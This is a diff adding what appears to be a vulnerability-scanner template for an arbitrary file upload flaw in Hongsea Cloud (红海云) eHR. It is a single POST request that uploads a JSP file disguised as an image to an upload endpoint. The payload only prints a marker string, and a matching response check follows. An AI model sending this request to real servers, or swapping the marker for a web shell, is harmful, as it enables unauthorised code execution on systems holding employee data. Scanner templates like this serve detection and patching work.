@@ -1,0 +1,28 @@
+id:
+
+info:
+  name: 红海云eHR 任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /RedseaPlatform/PtFjk.mob?method=upload
+  headers:
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4
+  data: |
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4
+    Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
+    Content-Type:image/jpeg
+
+    <% out.print("hello,eHR");%>
+    ------WebKitFormBoundaryt7WbDl1tXogoZys4--
+response1:
+  headers:
+  body: Path
+  code:
+requests2:
+response2:
